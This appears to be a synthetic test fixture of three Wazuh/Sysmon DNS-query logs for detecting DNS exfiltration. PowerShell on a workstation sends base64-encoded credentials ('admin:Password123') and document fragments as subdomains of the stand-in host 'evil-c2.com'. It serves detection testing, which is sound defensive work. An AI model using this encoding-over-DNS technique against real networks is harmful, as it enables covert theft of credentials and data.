{
  "_metadata": {
    "attack_id": "T1048.003",
    "variation": "001",
    "name": "DNS Data Exfiltration",
    "description": "Attacker exfiltrates data encoded in DNS queries",
    "expected_detection": "HIGH",
    "expected_soar": "exfiltration-detection",
    "kill_chain_phase": "exfiltration",
    "notes": "Data encoded in DNS subdomain queries",
    "format": "wazuh-native",
    "format_version": "1.0"
  },
  "logs": [
    {
      "_comment": "Suspicious DNS query with encoded data",
      "sequence": 1,
      "timestamp": "2026-01-29T15:30:00.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 22: DNS Data Exfiltration",
          "id": "100100",
          "mitre": {
            "id": [
              "T1048.003"
            ],
            "tactic": [
              "Exfiltration"
            ],
            "technique": [
              "DNS Data Exfiltration"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event22",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.879121633",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "22",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 15:30:00.000",
              "processGuid": "{T1048003-0001-0001-0001-000000000001}",
              "processId": "8700",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "queryName": "YWRtaW46UGFzc3dvcmQxMjM.data.evil-c2.com",
              "queryStatus": "0",
              "queryResults": "type: 1 ::1;",
              "user": "CORP\\john.doe"
            }
          }
        }
      }
    },
    {
      "_comment": "Multiple DNS queries indicating exfil stream",
      "sequence": 2,
      "timestamp": "2026-01-29T15:30:01.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 22: DNS Data Exfiltration",
          "id": "100100",
          "mitre": {
            "id": [
              "T1048.003"
            ],
            "tactic": [
              "Exfiltration"
            ],
            "technique": [
              "DNS Data Exfiltration"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event22",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.257644630",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "22",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 15:30:01.000",
              "processGuid": "{T1048003-0001-0001-0001-000000000001}",
              "processId": "8700",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "queryName": "c2VjcmV0X2RvY3VtZW50X2NvbnRl.data.evil-c2.com",
              "queryStatus": "0",
              "queryResults": "type: 1 ::1;",
              "user": "CORP\\john.doe"
            }
          }
        }
      }
    },
    {
      "_comment": "High frequency DNS queries to same domain",
      "sequence": 3,
      "timestamp": "2026-01-29T15:30:02.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 22: DNS Data Exfiltration",
          "id": "100100",
          "mitre": {
            "id": [
              "T1048.003"
            ],
            "tactic": [
              "Exfiltration"
            ],
            "technique": [
              "DNS Data Exfiltration"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event22",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.249760890",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "22",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 15:30:02.000",
              "processGuid": "{T1048003-0001-0001-0001-000000000001}",
              "processId": "8700",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "queryName": "bnRzX2FuZF9maW5hbmNpYWxfZGF0.data.evil-c2.com",
              "queryStatus": "0",
              "queryResults": "type: 1 ::1;",
              "user": "CORP\\john.doe"
            }
          }
        }
      }
    }
  ]
}